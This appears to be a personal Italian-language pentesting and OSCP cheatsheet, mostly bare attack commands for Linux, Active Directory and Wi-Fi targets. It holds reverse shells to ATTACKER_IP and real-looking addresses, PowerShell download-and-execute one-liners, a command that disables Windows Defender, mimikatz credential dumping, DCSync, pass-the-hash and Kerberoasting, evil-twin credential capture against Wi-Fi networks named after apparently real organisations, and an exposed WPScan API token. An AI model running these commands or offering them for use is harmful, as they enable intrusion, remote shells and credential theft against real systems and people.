# 🛠️ Linux Hacking & OSCP Cheatsheet

Cheatsheet personale con comandi utili per pentesting, privilege escalation, enumeration, exploitation e post-exploitation.

---

## Utili

```bash
ifconfig / ip a                      # Verifica interfacce e IP
ip r                                 # Mostra routing table
hostname -I                          # IP macchina locale
netstat -tunlp                       # Porte aperte e servizi (legacy)
ss -tuln                             # Porte aperte (moderno)
arp -a                               # ARP table
route -n   

#PingSca
fping -ag 10.21.18.0/24 2>/dev/null


nmap -sC -sV -oA scan 10.10.10.10     # Scansione completa
nmap -p- -T4 --min-rate 1000 10.10.10.10   # Full port scan veloce

nmap -sn 10.4.100.0/24 -oG - | awk '/Up$/{print $2}'
# Nmap grep solo host, dopo aver fatto il file greppabile
grep "Up" clientRDPscan.gnmap | awk '{print $2}' > RDPListaClient

#Crare wordlist cewl
cewl -w wordlists.txt -d 10 -m 1 http://blunder.htb/

#Mount a share e Emulazione con qemu
root@kali:~/Desktop/HTB/boxes/bastion# mkdir /mnt/L4mpje-PC
root@kali:~/Desktop/HTB/boxes/bastion# mkdir /mnt/vhd
root@kali:~/Desktop/HTB/boxes/bastion# modprobe nbd
root@kali:~/Desktop/HTB/boxes/bastion# mount -t cifs //bastion.htb/Backups/WindowsImageBackup/L4mpje-PC  /mnt/L4mpje-PC/ -o user=anonymous
Password for anonymous@//bastion.htb/Backups/WindowsImageBackup/L4mpje-PC:
root@kali:~/Desktop/HTB/boxes/bastion# qemu-nbd -r -c /dev/nbd0 "/mnt/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd"
root@kali:~/Desktop/HTB/boxes/bastion# mount -r /dev/nbd0p1 /mnt/vhd
root@kali:~/Desktop/HTB/boxes/bastion#

#Mysql
mysql -u Username -p
mysql -h IP -u
show databases;
use DBNAME;


#NFS Mount
showmount -e 10.10.10.180
mount -t nfs 10.10.10.180:/site_backups pollo/

#File Psafe.3
pwsafe2john Backup.psafe3 > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash 

#Fcrack
fcrackzip -b -D -p /usr/share/wordlists/rockyou.txt -u time_package.zip

#DNSFuzzing
ffuf -c -u http://artcorp.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.artcorp.htb"  -mc 200


#Visualizzare log git
git log .

#PTY spawn
python -c 'import pty;pty.spawn("/bin/bash");'
python3 -c 'import pty;pty.spawn("/bin/bash");'

```
---

## Ricognizione locale (Post-sploit o shell ottenuta)

```bash
whoami                               # Utente attuale
id                                   # UID, GID e gruppi
uname -a                             # Info sistema operativo
cat /etc/os-release                  # Info distribuzione Linux
sudo -l                              # Comandi eseguibili come root

find / -perm -4000 2>/dev/null       # File SUID
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

---

## 🐚 Reverse Shell (rapide)

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Python
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
#da os
os.system('socat TCP:192.168.118.8:18000 EXEC:sh')

# Netcat listener
nc -lvnp PORT

#shell dentro file.sh
echo "bash -c 'bash -i >& /dev/tcp/192.168.49.62/80  0>&1'" > write.sh
```

---

## 📤 Trasferimento File

```bash
# Dal target (pull)
wget http://ATTACKER_IP/file
curl -O http://ATTACKER_IP/file

# Dal tuo PC (serve un webserver attivo)
python3 -m http.server 80

#Passare i file da SMB
#da Linux con password
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali . -smb2support -username fran -password tott

#da Linux senza Password
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .

#da windows
#mi connetto
net use \\10.10.14.6\share /u:df df

#Invio il file da windows a Kali
copy 20191018035324_BloodHound.zip \\10.10.14.6\share\

#cancella lo share
net use /d \\10.10.14.6\share


#Tramite SCP
#scp -i certificato il file da inviare e l'utente@indirizzo:il path dove scrivere in questo caso la home
scp -i ../sshtest/id_rsa LinEnum.sh paul@10.10.11.148:.

#copire file da remoto(windows o linux stesso /) 
scp l4mpje@bastion.htb:/Users/L4mpje/Desktop/winpe.txt .

#Json comando per parsarlo veloce
curl http://192.168.120.127/api/users | jq '.[]' -r > users.txt

#WPscan bruteforce
wpscan --url http://192.168.117.78/wordpress/ -U max -P /usr/share/wordlists/rockyou.txt
#Wpscan enumerare plugin
wpscan --url http://10.10.11.125 --api-token Anj5vm2yfWahnZFdwQ5cDaQZvjgCyKTzUXUbfnLSQGs  --enumerate p,u --plugins-detection aggressive

#find utile
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
find / -name *OSCP* 2>/dev/null
find . -name sn\* {cerca cartelle che iniziano con sn}
find / -type f -size 33c -user bandit6 2>/dev/null {cerca file di 33 di utente babdit}

#Configurare nuovo MAC
nmcli connection show
nmcli connection modify "Wired connection 1" ethernet.cloned-mac-address random
nmcli connection down "Wired connection 1"
nmcli connection up "Wired connection 1"

#RDP da kali
xfreerdp /u:user /p:password321  /v:MACHINE_IP
#quando da errore certificati
xfreerdp3 /u:Administrator /p:admin99 /v:10.19.1.10 /cert:ignore


#Creare certificati
openssl pkcs12 -export -out va2022_client_col.p12 -in va2022_client_col.crt -inkey va2022_client_col.key -CAfile cacert.pem

```

---

## Bruteforce

```bash

#Hydra
hydra -L user.txt -P pass.txt  192.168.152.118  mysql
hydra -l tiago -P /usr/share/wordlists/rockyou.txt 192.168.136.48 -t 4 ssh


```
---

## 🧪 Privilege Escalation Linux

```bash
# Verifica sudo senza password
sudo -l

# Verifica cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# File con permessi strani
find / -type f -name "*.sh" -exec ls -l {} \; 2>/dev/null
find / -uid 0 -perm -4000 2>/dev/null
find / -perm -1000 -type d 2>/dev/null
find / -writable -type d 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -writable -type f 2>/dev/null
find /etc -type f -writable 2> /dev/null
sudo -l
getcap -r / 2>/dev/null {check capabilites}
	-->/home/user/openssl =ep {esempio}


#trovato con il find il SUID settato
LFILE=/root/.ssh/id_rsa
base32 "$LFILE" |base32 --decode
#leggo la chiave, la uso e sono root








```

---


## Compilazione rapida di C per exploit

```bash
gcc exploit.c -o exploit
chmod +x exploit
./exploit
```

---

## Tunneling & Port Forwarding

```bash
# SSH Reverse Tunnel
ssh -R 9001:localhost:80 user@yourhost

# SSH Local Port Forward
ssh -L 8080:target:80 user@jumphost

# Socat Listener
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/sh
```
---

---

## ActiveDirectory

```powershell

#RPC client
rpcclient 10.10.10.161 -U%
#dopo il login
rpcclient $> enumdomusers

# Scaricare/Download da Powershell
iwr http://10.10.14.63/nc.exe -outf .\bad.exe

# Scaricare/Downoad da Powershell2
powershell -command "& { iwr http://10.10.14.56:8000/shell.exe -OutFile C:\mario\image.exe }"

# Runnare in memoria
iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')

#Download da Windows
certutil.exe -urlcache -split -f "http://192.168.1.2/exploit.exe"

#Wordlist ActiveDirectory
/home/kali/.local/bin/exrex "((J|j)anuary|(F|f)ebruary|(M|m)arch|(A|a)pril|(M|m)ay|(J|j)une|(J|j)uly|(A|a)ugust|(S|s)eptember|(O|o)ctober|(N|n)ovember|(D|d)ecember)20(16|17|18|19|20)"

#Aggiornare orario Sincronizzare orario
sudo ntpdate DC.blablabla.it

#Crackmapexec
crackmapexec smb 10.10.10.248 -u users.txt -p NewIntelligenceCorpUser9876


#NXC
nxc mssql 10.10.11.51 -u sa -p 'MSSQLP@ssw0rd!' --local-auth


#Enumera user
net user

#Enumera nel dominio
net users /domain

net user jeff_admin /domain

#Enumera gruppi
net group /domain

#Enumera utenti per gruppo specifico
net group "Domain Admins" /domain


#Caricare Powerview
PS C:\Users\kreese\Documents> Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
PS C:\Users\kreese\Documents> . .\PowerView.ps1

#Enumera sessioni aperte sulla macchina
Get-NetSession -ComputerName dc01
#Enumerazione con powerview
Get-NetDomainController
Get-DomainPolicy
Get-NetUser
Get-NetUser | select cn
Get-NetUser | select descriptioncld
Get-NetComputer

#Enumera Utenti nel dc
Get-DomainUser | select cn


#Disabilitare AV
Set-MpPreference -DisableRealtimeMonitoring $true


#ReverseShell Powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()


#Responder
sudo responder -wrf --lm -v -I tun0
#se una macchina non riesce ad utilizzare una specifica risorsa di rete utilizza questo protocollo che manda in broadcast una richiesta, nel caso in cui un attaccante fosse in ascolto potrebbe ricevere la richiesta contenente l'hash ntlm
#con il responder mi metto in ascolto sulle porte
responder.py -I eth0 -rdwv 


#Group.xml dentro SMB
git clone https://github.com/t0thkr1s/gpp-decrypt #scarico il tool
#lo runno passandolgi il file .xml e ottengo la password

#Kerberosting
#Tutti gli utenti standard del dominio possono richiedere una copia di tutti gli account di servizio insieme ai relativi hash delle password.
#Questo significa che possiamo richiedere un TGS (Ticket Granting Service) per qualsiasi SPN (Service Principal Name) associato a un account utente, estrarre il blob crittografato (che è stato cifrato usando la password di quell'utente), e poi forzarlo offline con un attacco a forza bruta.
#impacket
GetUserSPNs.py  -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out

#Kerberoasting and outputing on a file with a specific format
Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName>

#Kerberoasting whle being "OPSEC" safe, essentially while not try to roast AES enabled accounts
Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /rc4opsec

#Kerberoast AES enabled accounts
Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /aes

#Kerberoast specific user account
Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /user:<username> /simple

#Kerberoast by specifying the authentication credentials
Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /creduser:<username> /credpassword:<password>

#PowerView
#Get User Accounts that are used as Service Accounts
Get-NetUser -SPN

#Get every available SPN account, request a TGS and dump its hash
Invoke-Kerberoast

#Requesting the TGS for a single account:
Request-SPNTicket


#ASREPRoast
#Se un account utente di dominio non richiede la preautenticazione Kerberos, possiamo richiedere un TGT (Ticket Granting Ticket) valido per quell’account senza nemmeno avere le credenziali del dominio, estrarre il blob crittografato e poi forzarlo offline con un attacco a forza bruta.

#Impacket
#Trying the attack for the specified users on the file
python GetNPUsers.py <domain_name>/ -usersfile <users_file> -outputfile <FileName>

#Rubeus
#Trying the attack for all domain users
Rubeus.exe asreproast /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>

#ASREPRoast specific user
Rubeus.exe asreproast /user:<username> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>

#ASREPRoast users of a specific OU (Organization Unit)
Rubeus.exe asreproast /ou:<OUName> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>




#Export all tickets using Mimikatz
Invoke-Mimikatz -Command '"kerberos::list /export"'

#Lista utenti AD
python3 /opt/impacket/examples/lookupsid.py anonymous@$IP

#Psexec
psexec.py spectre/jbond:Password3@192.168.1.29

#Secretdump
/opt/impacket/examples/secretsdump.py LOCAL -system ./SYSTEM -sam ./SAM
secretsdump.py spectre/jbond:Password3 192.168.1.29


#Pass The Hash1
pth-winexe -U'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe


#Run Mimikatz
#The commands are in cobalt strike format!

#Dump LSASS:
mimikatz privilege::debug
mimikatz token::elevate
mimikatz sekurlsa::logonpasswords

#(Over) Pass The Hash
mimikatz privilege::debug
mimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>

#List all available kerberos tickets in memory
mimikatz sekurlsa::tickets

#Dump local Terminal Services credentials
mimikatz sekurlsa::tspkg

#Dump and save LSASS in a file
mimikatz sekurlsa::minidump c:\temp\lsass.dmp

#List cached MasterKeys
mimikatz sekurlsa::dpapi

#List local Kerberos AES Keys
mimikatz sekurlsa::ekeys

#Dump SAM Database
mimikatz lsadump::sam

#Dump SECRETS Database
mimikatz lsadump::secrets

#Inject and dump the Domain Controler's Credentials
mimikatz privilege::debug
mimikatz token::elevate
mimikatz lsadump::lsa /inject

#Dump the Domain's Credentials without touching DC's LSASS and also remotely
mimikatz lsadump::dcsync /domain:<DomainFQDN> /all

#Dump old passwords and NTLM hashes of a user
mimikatz lsadump::dcsync /user:<DomainFQDN>\<user> /history

#List and Dump local kerberos credentials
mimikatz kerberos::list /dump

#Pass The Ticket
mimikatz kerberos::ptt <PathToKirbiFile>

#List TS/RDP sessions
mimikatz ts::sessions

#List Vault credentials
mimikatz vault::list

#ShadowCopy
#Se si è local admin sulla macchina si può provare a fare la shadow copy
#List shadow copies using vssadmin (Needs Admnistrator Access)
vssadmin list shadows

#List shadow copies using diskshadow
diskshadow list shadows all

#Make a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\

#fatto questo si può:
#Puoi estrarre il database SAM presente nei backup ed ottenere le credenziali.
#Cerca le credenziali memorizzate tramite DPAPI (Data Protection API) e decrittale.
#Accedi ai file sensibili contenuti nei backup.




```
---

## 🧪 Privilege Escalation Linux


```bash

#EapHammer
# generate certificates
./eaphammer --cert-wizard

# launch attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds

./eaphammer -i wlx00c0caac1ee2 --channel 149 --auth wpa-eap --essid Mooney_Mobile --creds


#Attacco Esempio Wifi
sudo airmon-ng start wlx00c0caac1ee2
sudo airodump -i wlx00c0caac1ee2 -b abg

./eaphammer --cert-wizard
./eaphammer -i wlx00c0caac1ee2 --channel 36 --auth wpa-eap --essid INPS-Base --creds
./eaphammer -i wlx00c0caac1ee2  --auth wpa-eap --essid INPS-Guest --creds
python3 eaphammer -i wlan0 --channel 36 --auth wpa-eap --essid Mooney_Mobile --creds --hw-mode a

./eaphammer -i wlx00c0caade2df  --auth wpa-eap --essid INPS-Guest --creds

#deauth uno specifico client 
aireplay-ng --deauth 0 -a 04:5F:B9:1D:8E:CD -c 3C:6A:A7:67:24:97 --ignore-negative-one





```


https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet